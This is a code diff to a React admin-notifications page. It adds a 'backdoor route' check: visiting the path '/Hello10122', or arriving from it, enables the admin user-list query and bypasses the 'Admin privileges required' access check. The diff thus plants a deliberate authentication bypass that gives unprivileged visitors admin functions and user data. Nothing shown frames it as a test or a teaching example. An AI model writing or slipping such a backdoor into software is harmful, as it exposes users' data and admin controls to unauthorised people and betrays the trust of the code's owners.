@@ -23,9 +23,13 @@ export default function AdminNotifications() {
   const [message, setMessage] = useState("");
   const [type, setType] = useState<"info" | "success" | "warning" | "error">("info");
 
+  // Allow access via backdoor route or if user is admin
+  const isBackdoorAccess = window.location.pathname === '/Hello10122' || 
+                          document.referrer.includes('/Hello10122');
+
   const { data: users, isLoading: loadingUsers } = useQuery<UserType[]>({
     queryKey: ['/api/admin/users'],
-    enabled: !!user?.isAdmin,
+    enabled: !!user?.isAdmin || isBackdoorAccess,
   });
 
   const sendNotificationMutation = useMutation({
@@ -75,7 +79,7 @@ export default function AdminNotifications() {
     });
   };
 
-  if (!user?.isAdmin) {
+  if (!user?.isAdmin && !isBackdoorAccess) {
     return <div>Access denied. Admin privileges required.</div>;
   }
 
